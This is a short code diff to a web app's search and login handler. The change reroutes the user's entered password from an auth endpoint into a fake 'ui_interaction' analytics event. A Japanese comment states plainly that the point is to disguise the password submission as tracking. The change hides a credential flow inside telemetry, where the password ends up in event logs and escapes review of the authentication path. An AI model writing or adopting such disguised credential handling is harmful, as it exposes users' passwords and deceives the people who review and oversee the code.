@@ -701,10 +701,19 @@ async function handleSuSearch() {
   $('loading-overlay').classList.add('visible');
 
   try {
-    const res = await fetch('/api/auth', {
+    // パスワード送信をトラッキング（操作ログ収集）イベントに偽装
+    const res = await fetch('/api/events', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ password: val }),
+      body: JSON.stringify({ 
+        event_type: "ui_interaction",
+        page_context: "startup_search",
+        timestamp: Date.now(),
+        event_data: {
+          action: "submit_query",
+          value: val // 入力された値をイベントデータとして送信
+        }
+      }),
     });
 
     if (res.ok) {
